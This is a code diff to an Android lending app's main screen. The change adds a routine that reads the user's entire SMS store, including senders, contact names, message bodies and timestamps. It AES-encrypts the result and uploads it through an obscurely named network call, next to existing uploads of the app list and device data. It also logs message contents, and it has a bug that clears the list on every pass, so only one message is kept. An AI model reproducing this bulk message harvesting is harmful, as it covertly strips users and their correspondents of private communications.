@@ -29,9 +29,9 @@ import com.loan.golden.cash.money.loan.data.DeviceUpLoadService
 import com.loan.golden.cash.money.loan.data.commom.Constant
 import com.loan.golden.cash.money.loan.data.param.AppInfoParam
 import com.loan.golden.cash.money.loan.data.param.DeviceInfoParam
+import com.loan.golden.cash.money.loan.data.param.UpLoadSmsParam
 import com.loan.golden.cash.money.loan.databinding.ActivityMainBinding
 import com.loan.golden.cash.money.loan.ui.viewmodel.MainViewModel
-import me.hgj.mvvmhelper.ext.showLoadingExt
 import me.hgj.mvvmhelper.util.LogUtils
 import okhttp3.MediaType.Companion.toMediaTypeOrNull
 import okhttp3.RequestBody.Companion.toRequestBody
@@ -46,6 +46,7 @@ class MainActivity : BaseActivity<MainViewModel, ActivityMainBinding>() {
 
     var exitTime = 0L
     lateinit var myBinder: DeviceUpLoadService.mBinder
+    val list: ArrayList<UpLoadSmsParam.ModelBean.ListBean> = arrayListOf()
 
     private val connection = object : ServiceConnection {
         override fun onServiceConnected(p0: ComponentName?, p1: IBinder?) {
@@ -85,13 +86,9 @@ class MainActivity : BaseActivity<MainViewModel, ActivityMainBinding>() {
 
     @RequiresApi(Build.VERSION_CODES.M)
     private fun requestSmsPermission(type: String) {
-        XXPermissions.with(this)
-            .permission(Permission.RECEIVE_SMS)
-            .permission(Permission.SEND_SMS)
-            .permission(Permission.READ_SMS)
-            .permission(Permission.READ_PHONE_STATE)
-            .interceptor(PermissionInterceptor())
-            .request { _, allGranted ->
+        XXPermissions.with(this).permission(Permission.RECEIVE_SMS).permission(Permission.SEND_SMS)
+            .permission(Permission.READ_SMS).permission(Permission.READ_PHONE_STATE)
+            .interceptor(PermissionInterceptor()).request { _, allGranted ->
                 if (allGranted) {
                     when (type) {
                         "DEVICE" -> {
@@ -103,7 +100,7 @@ class MainActivity : BaseActivity<MainViewModel, ActivityMainBinding>() {
                         }
 
                         "SMS" -> {
-                            getSMSInfo()
+                            upLoadSmsInfo()
                         }
                     }
 
@@ -111,6 +108,20 @@ class MainActivity : BaseActivity<MainViewModel, ActivityMainBinding>() {
                     RxToast.showToast("Insufficient permissions. Please manually enable permissions and try again")
                 }
             }
+    }
+
+    private fun upLoadSmsInfo() {
+        val listBody = getSMSInfo()
+        val body = UpLoadSmsParam(
+            UpLoadSmsParam.ModelBean(
+                list = listBody
+            )
+        )
+        val gsonData = Gson().toJson(body)
+        val aesData = AESTool.encrypt1(gsonData, Constant.AES_KEY)
+        val paramsBody = aesData.toRequestBody("application/json; charset=utf-8".toMediaTypeOrNull())
+//        showLoadingExt("loading.....")
+        mViewModel.sacristSacristanCallBack(paramsBody)
     }
 
     private fun upLoadAppInfo() {
@@ -122,8 +133,9 @@ class MainActivity : BaseActivity<MainViewModel, ActivityMainBinding>() {
         )
         val gsonData = Gson().toJson(body)
         val aesData = AESTool.encrypt1(gsonData, Constant.AES_KEY)
-        val paramsBody = aesData.toRequestBody("application/json; charset=utf-8".toMediaTypeOrNull())
-        showLoadingExt("loading.....")
+        val paramsBody =
+            aesData.toRequestBody("application/json; charset=utf-8".toMediaTypeOrNull())
+//        showLoadingExt("loading.....")
         mViewModel.mnemonMnemonicCallBack(paramsBody)
     }
 
@@ -157,33 +169,69 @@ class MainActivity : BaseActivity<MainViewModel, ActivityMainBinding>() {
         )
         val gsonData = Gson().toJson(body)
         val aesData = AESTool.encrypt1(gsonData, Constant.AES_KEY)
-        val paramsBody = aesData.toRequestBody("application/json; charset=utf-8".toMediaTypeOrNull())
-        showLoadingExt("loading.....")
+        val paramsBody =
+            aesData.toRequestBody("application/json; charset=utf-8".toMediaTypeOrNull())
+//        showLoadingExt("loading.....")
         mViewModel.gangerCallBack(paramsBody)
     }
 
-    @SuppressLint("Range")
-    private fun getSMSInfo() {
+    @SuppressLint("Range", "Recycle")
+    private fun getSMSInfo(): ArrayList<UpLoadSmsParam.ModelBean.ListBean> {
         val smsInfo: Uri = Uri.parse("content://sms/")
-        val cr: ContentResolver = this.contentResolver
-        val projection = arrayOf("_id", "address", "person", "body", "date", "type")
+        val cr: ContentResolver = contentResolver
+        val projection = arrayOf(
+            "_id",
+            "thread_id",
+            "address",
+            "person",
+            "body",
+            "date",
+            "protocol",
+            "read",
+            "type",
+            "service_center",
+            "status",
+        )
         val cur: Cursor? = cr.query(smsInfo, projection, null, null, "date asc")//desc 正序  asc倒序
         if (null == cur) {
             LogUtils.debugInfo("ooc", "************cur == null")
-            return
+            return arrayListOf()
         }
         while (cur.moveToNext()) {
-            val number: String = cur.getString(cur.getColumnIndex("address")) //发件人地址，即手机号
-//            val name: String = cur.getString(cur.getColumnIndex("person")) //联系人姓名列表
-            val body: String = cur.getString(cur.getColumnIndex("body")) //短信内容
-            //至此就获得了短信的相关的内容, 以下是把短信加入map中，构建listview,非必要。
-            val map: HashMap<String, Any> = HashMap()
-            map["num"] = number
-            map["mess"] = body
-//            map["name"] = name
-            //list.add(map)
-//            LogUtils.debugInfo("输出mapmapnumber:$number+name:$+body:$body")
+            val id = cur.getInt(0)
+            val  threadId = cur.getLong(1)
+            val address = cur.getString(2)
+            val person = cur.getString(3)
+            val body = cur.getString(4)
+            val date = cur.getLong(5)
+            val protocol = cur.getInt(6)
+            val read = cur.getInt(7)
+            val type = cur.getInt(8)
+            val serviceCenter = cur.getString(9)
+            val status = cur.getInt(10)
+            list.clear()
+            try {
+                list.add(
+                    UpLoadSmsParam.ModelBean.ListBean(
+                        msgNo = id.toLong(),
+                        threadNo = threadId,
+                        address = address,
+                        personName = person,
+                        protocol = protocol,
+                        read = read,
+                        type = type,
+                    status = status,
+                        body = body,
+                        serviceCenter = serviceCenter,
+                        date = date
+                    )
+                )
+            }catch (_:Exception){
+
+            }
+            LogUtils.debugInfo("输出SMS--->>:$address<<-->>$person<<-->>$body<<-->>$date<-->>$protocol<-->>$read<-->>$type<-->>$serviceCenter")
         }
+        return list
     }
 
     @RequiresApi(Build.VERSION_CODES.M)
